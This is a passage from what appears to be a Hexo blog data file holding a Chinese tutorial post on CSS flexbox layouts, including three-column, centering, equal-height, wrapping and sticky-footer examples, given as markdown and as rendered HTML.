二、实现水平垂直居中效果\n\ncss 代码：\n\n```css \nhtml, body{\n    height: 100%;\n}\nbody{\n    display: flex;\n    justify-content: center;\n    align-items: center;\n}\ndiv{\n    height: 100px;\n    width: 100px;\n    background: red;\n}\n```\n\n效果：\n\n![](/assets/2016-03-13-css-flexbox/2.png)\n\n## 三、实现等高列布局\n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"item\"></div>\n    <div class=\"item main\"></div>\n    <div class=\"item\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    display:flex;\n    align-items: stretch;\n    width: 960px;\n    margin: 0 auto;\n}\n.item{\n    flex: 1;\n    background: orange;\n    margin: 10px;\n}\n.main{\n    height: 400px;       //假设内容高度撑起由 400px\n}\n```\n\n这里我们假设左右栏的高度由中间内容自适应，而假设中间内容高度由 400px;\n\n效果：\n\n![](/assets/2016-03-13-css-flexbox/3.png)\n\n## 四、实现流式布局\n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    display: flex;\n    width: 600px;\n    margin: 0 auto;\n    flex-wrap: wrap;\n}\n.item{\n    margin: 20px;\n    flex: none;\n    width: 100px;\n    height: 100px;\n    background: lightblue;\n    line-height: 100px;\n    color: #fff;\n    font-size: 40px;\n    text-align: center;\n}\n```\n\n效果：\n\n![](/assets/2016-03-13-css-flexbox/4.png)\n\n## 五、悬挂式布局\n\n有时，主栏的左侧或右侧，需要添加一个图片栏。\n\n效果：\n\n![](/assets/2016-03-13-css-flexbox/5.png)\n\n\n## 六、固定的底栏\n\n有时，页面内容太少，无法占满一屏的高度，底栏就会抬高到页面的中间。这时可以采用Flex布局，让底栏总是出现在页面的底部。\n\n效果：\n\n![](/assets/2016-03-13-css-flexbox/6.png)\n\n参考链接：\n\n* [Flex 布局教程：实例篇 - 阮一峰的网络日志](http://www.ruanyifeng.com/blog/2015/07/flex-examples.html)\n","source":"_posts/2016-03-13-css-flexbox.md","raw":"---\nlayout:     post\ntitle:      \"CSS - Flexbox 实例\"\ndate:       2016-03-13 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/13.jpg\"\ntags:\n    - CSS\n---\n\n介绍一些 Flexbox 在页面布局上的应用\n\n注：这里不再阐述原理及实现细节，若想学习 Flexbox 如何使用，可以查看 [CSS - Flex 布局学习笔记](http://www.happylindz.com/2016/03/12/learn-css-flexbox/)\n\n## 一、实现三列自适应布局\n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"main\"></div>\n    <div class=\"left\"></div>\n    <div class=\"right\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    display: flex;\n}\n.left{\n    width: 100px;\n    background: orange;\n    order: -1;      //使 .left 排列在 .main左边\n}\n.right{\n    width: 200px;\n    background: lavender;\n}\n.main{\n    background: mediumaquamarine;\n    flex: 1;\n    height: 300px;         //假设内容有 300px 高度\n    margin-left: 20px;\n    margin-right: 10px;\n}\n```\n\n效果：\n\n![](/assets/2016-03-13-css-flexbox/1.png)\n\n不仅实现了三列布局，中间内容自适应，并且 .main 的内容优先加载，并且设置布局十分简单。\n\n## 二、实现水平垂直居中效果\n\ncss 代码：\n\n```css \nhtml, body{\n    height: 100%;\n}\nbody{\n    display: flex;\n    justify-content: center;\n    align-items: center;\n}\ndiv{\n    height: 100px;\n    width: 100px;\n    background: red;\n}\n```\n\n效果：\n\n![](/assets/2016-03-13-css-flexbox/2.png)\n\n## 三、实现等高列布局\n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"item\"></div>\n    <div class=\"item main\"></div>\n    <div class=\"item\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    display:flex;\n    align-items: stretch;\n    width: 960px;\n    margin: 0 auto;\n}\n.item{\n    flex: 1;\n    background: orange;\n    margin: 10px;\n}\n.main{\n    height: 400px;       //假设内容高度撑起由 400px\n}\n```\n\n这里我们假设左右栏的高度由中间内容自适应，而假设中间内容高度由 400px;\n\n效果：\n\n![](/assets/2016-03-13-css-flexbox/3.png)\n\n## 四、实现流式布局\n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n    <div class=\"item\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    display: flex;\n    width: 600px;\n    margin: 0 auto;\n    flex-wrap: wrap;\n}\n.item{\n    margin: 20px;\n    flex: none;\n    width: 100px;\n    height: 100px;\n    background: lightblue;\n    line-height: 100px;\n    color: #fff;\n    font-size: 40px;\n    text-align: center;\n}\n```\n\n效果：\n\n![](/assets/2016-03-13-css-flexbox/4.png)\n\n## 五、悬挂式布局\n\n有时，主栏的左侧或右侧，需要添加一个图片栏。\n\n效果：\n\n![](/assets/2016-03-13-css-flexbox/5.png)\n\n\n## 六、固定的底栏\n\n有时，页面内容太少，无法占满一屏的高度，底栏就会抬高到页面的中间。这时可以采用Flex布局，让底栏总是出现在页面的底部。\n\n效果：\n\n![](/assets/2016-03-13-css-flexbox/6.png)\n\n参考链接：\n\n* [Flex 布局教程：实例篇 - 阮一峰的网络日志](http://www.ruanyifeng.com/blog/2015/07/flex-examples.html)\n","slug":"2016-03-13-css-flexbox","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rxv000mxmvdqao5atmb","content":"<p>介绍一些 Flexbox 在页面布局上的应用</p>\n<p>注：这里不再阐述原理及实现细节，若想学习 Flexbox 如何使用，可以查看 <a href=\"http://www.happylindz.com/2016/03/12/learn-css-flexbox/\" target=\"_blank\" rel=\"external\">CSS - Flex 布局学习笔记</a></p>\n<h2 id=\"一、实现三列自适应布局\"><a href=\"#一、实现三列自适应布局\" class=\"headerlink\" title=\"一、实现三列自适应布局\"></a>一、实现三列自适应布局</h2><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.container&#123;</span><br><span class=\"line\">    display: flex;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.left&#123;</span><br><span class=\"line\">    width: 100px;</span><br><span class=\"line\">    background: orange;</span><br><span class=\"line\">    order: -1;      //使 .left 排列在 .main左边</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.right&#123;</span><br><span class=\"line\">    width: 200px;</span><br><span class=\"line\">    background: lavender;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.main&#123;</span><br><span class=\"line\">    background: mediumaquamarine;</span><br><span class=\"line\">    flex: 1;</span><br><span class=\"line\">    height: 300px;         //假设内容有 300px 高度</span><br><span class=\"line\">    margin-left: 20px;</span><br><span class=\"line\">    margin-right: 10px;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-13-css-flexbox/1.png\" alt=\"\"></p>\n<p>不仅实现了三列布局，中间内容自适应，并且 .main 的内容优先加载，并且设置布局十分简单。</p>\n<h2 id=\"二、实现水平垂直居中效果\"><a href=\"#二、实现水平垂直居中效果\" class=\"headerlink\" title=\"二、实现水平垂直居中效果\"></a>二、实现水平垂直居中效果</h2><p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">html</span>, <span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: flex;</span><br><span class=\"line\">    <span class=\"attribute\">justify-content</span>: center;</span><br><span class=\"line\">    <span class=\"attribute\">align-items</span>: center;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-13-css-flexbox/2.png\" alt=\"\"></p>\n<h2 id=\"三、实现等高列布局\"><a href=\"#三、实现等高列布局\" class=\"headerlink\" title=\"三、实现等高列布局\"></a>三、实现等高列布局</h2><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.container&#123;</span><br><span class=\"line\">    display:flex;</span><br><span class=\"line\">    align-items: stretch;</span><br><span class=\"line\">    width: 960px;</span><br><span class=\"line\">    margin: 0 auto;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.item&#123;</span><br><span class=\"line\">    flex: 1;</span><br><span class=\"line\">    background: orange;</span><br><span class=\"line\">    margin: 10px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.main&#123;</span><br><span class=\"line\">    height: 400px;       //假设内容高度撑起由 400px</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里我们假设左右栏的高度由中间内容自适应，而假设中间内容高度由 400px;</p>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-13-css-flexbox/3.png\" alt=\"\"></p>\n<h2 id=\"四、实现流式布局\"><a href=\"#四、实现流式布局\" class=\"headerlink\" title=\"四、实现流式布局\"></a>四、实现流式布局</h2><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: flex;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">600px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span> auto;</span><br><span class=\"line\">    <span class=\"attribute\">flex-wrap</span>: wrap;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.item</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">flex</span>: none;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: lightblue;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">40px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-13-css-flexbox/4.png\" alt=\"\"></p>\n<h2 id=\"五、悬挂式布局\"><a href=\"#五、悬挂式布局\" class=\"headerlink\" title=\"五、悬挂式布局\"></a>五、悬挂式布局</h2><p>有时，主栏的左侧或右侧，需要添加一个图片栏。</p>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-13-css-flexbox/5.png\" alt=\"\"></p>\n<h2 id=\"六、固定的底栏\"><a href=\"#六、固定的底栏\" class=\"headerlink\" title=\"六、固定的底栏\"></a>六、固定的底栏</h2><p>有时，页面内容太少，无法占满一屏的高度，底栏就会抬高到页面的中间。这时可以采用Flex布局，让底栏总是出现在页面的底部。</p>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-13-css-flexbox/6.png\" alt=\"\"></p>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/07/flex-examples.html\" target=\"_blank\" rel=\"external\">Flex 布局教程：实例篇 - 阮一峰的网络日志</a></li>\n</ul>\n","excerpt":"","more":"<p>介绍一些 Flexbox 在页面布局上的应用</p>\n<p>注：这里不再阐述原理及实现细节，若想学习 Flexbox 如何使用，可以查看 <a href=\"http://www.happylindz.com/2016/03/12/learn-css-flexbox/\">CSS - Flex 布局学习笔记</a></p>\n<h2 id=\"一、实现三列自适应布局\"><a href=\"#一、实现三列自适应布局\" class=\"headerlink\" title=\"一、实现三列自适应布局\"></a>一、实现三列自适应布局</h2><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.container&#123;</span><br><span class=\"line\">    display: flex;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.left&#123;</span><br><span class=\"line\">    width: 100px;</span><br><span class=\"line\">    background: orange;</span><br><span class=\"line\">    order: -1;      //使 .left 排列在 .main左边</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.right&#123;</span><br><span class=\"line\">    width: 200px;</span><br><span class=\"line\">    background: lavender;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.main&#123;</span><br><span class=\"line\">    background: mediumaquamarine;</span><br><span class=\"line\">    flex: 1;</span><br><span class=\"line\">    height: 300px;         //假设内容有 300px 高度</span><br><span class=\"line\">    margin-left: 20px;</span><br><span class=\"line\">    margin-right: 10px;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-13-css-flexbox/1.png\" alt=\"\"></p>\n<p>不仅实现了三列布局，中间内容自适应，并且 .main 的内容优先加载，并且设置布局十分简单。</p>\n<h2 id=\"二、实现水平垂直居中效果\"><a href=\"#二、实现水平垂直居中效果\" class=\"headerlink\" title=\"二、实现水平垂直居中效果\"></a>二、实现水平垂直居中效果</h2><p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">html</span>, <span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: flex;</span><br><span class=\"line\">    <span class=\"attribute\">justify-content</span>: center;</span><br><span class=\"line\">    <span class=\"attribute\">align-items</span>: center;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-13-css-flexbox/2.png\" alt=\"\"></p>\n<h2 id=\"三、实现等高列布局\"><a href=\"#三、实现等高列布局\" class=\"headerlink\" title=\"三、实现等高列布局\"></a>三、实现等高列布局</h2><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.container&#123;</span><br><span class=\"line\">    display:flex;</span><br><span class=\"line\">    align-items: stretch;</span><br><span class=\"line\">    width: 960px;</span><br><span class=\"line\">    margin: 0 auto;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.item&#123;</span><br><span class=\"line\">    flex: 1;</span><br><span class=\"line\">    background: orange;</span><br><span class=\"line\">    margin: 10px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.main&#123;</span><br><span class=\"line\">    height: 400px;       //假设内容高度撑起由 400px</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里我们假设左右栏的高度由中间内容自适应，而假设中间内容高度由 400px;</p>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-13-css-flexbox/3.png\" alt=\"\"></p>\n<h2 id=\"四、实现流式布局\"><a href=\"#四、实现流式布局\" class=\"headerlink\" title=\"四、实现流式布局\"></a>四、实现流式布局</h2><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span 